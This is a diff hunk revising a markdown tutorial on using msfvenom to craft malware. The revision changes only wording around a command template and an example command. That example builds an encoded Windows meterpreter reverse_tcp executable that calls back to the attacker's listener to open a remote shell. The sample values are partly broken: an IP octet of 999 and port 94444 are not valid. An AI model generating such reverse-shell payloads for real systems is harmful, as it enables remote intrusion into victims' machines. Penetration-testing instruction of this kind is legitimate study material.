@@ -21,13 +21,12 @@ msfvenom -l platforms
 msfvenom -l encoders
 ```
 
-
-The formula for crafting the basic malware will also involve the IP address which you intend to use and a suitable port number
+The general formula for crafting the basic malware will also involve the IP address to be used and a suitable port number
 ```
 msfvenom -p (any payload) LHOST=(kali_IP) LPORT=94444 or 8080) -e (any encoder) --platform (any platform) -f (any file format) > (a unique filename).(file format)
 ```
 
-For example, here is a malware with all the elements in the general formula applied
+For example, here is a command to create a malware with all the elements in the general formula being applied
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.99.999 LPORT=4444 -e x86/call4_dword_xor --platform windows -f exe > meter_revtcp.exe
 ```
